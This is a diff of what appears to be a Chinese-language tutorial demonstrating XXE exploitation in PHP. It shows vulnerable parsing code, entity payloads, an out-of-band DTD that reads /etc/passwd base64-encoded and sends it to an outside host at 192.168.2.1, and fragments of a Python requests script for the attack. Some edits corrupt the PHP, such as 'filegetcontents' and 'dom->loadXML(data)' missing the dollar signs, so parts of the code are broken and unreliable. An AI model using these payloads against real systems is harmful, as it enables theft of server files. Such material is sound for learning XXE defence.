@@ -32,11 +32,10 @@ title: PHP XXE 利用过程演示
 
 ```php
 <?php
-$data = file_get_contents('php://input');
+$data = filegetcontents('php://input');
 $xml = simplexml_load_string($data);
 
 echo $xml->name;
-
 ```
 
 
@@ -51,7 +50,6 @@ payload:
 <root>
 <name>&xxe;</name>
 </root>
-
 ```
 
 
@@ -75,8 +73,7 @@ payload:
 $data = file_get_contents('php://input');
 
 $dom = new DOMDocument();
-$dom->loadXML($data);
-
+dom->loadXML(data);
 ```
 
 
@@ -95,7 +92,6 @@ $dom->loadXML($data);
 ```xml
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
 <!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://192.168.2.1/%file;'>">
-
 ```
 
 
@@ -107,7 +103,6 @@ $dom->loadXML($data);
 <!ENTITY % remote SYSTEM "http://192.168.2.1/test.dtd">
 %remote;%int;%send;
 ]>
-
 ```
 
 
@@ -133,7 +128,7 @@ $dom->loadXML($data);
 
 
 ```python
-_import requests
+import requests
 
 
 def buildxml(string):
@@ -163,8 +158,7 @@ for i in range(125, 135):
         print(string)
         buildxml(string)
     except:
-        continue_
-
+        continue
 ```
 
 
@@ -188,7 +182,6 @@ for i in range(125, 135):
 <dir>
 <file>&cmd;</file>
 </dir>
-
 ```
 
 
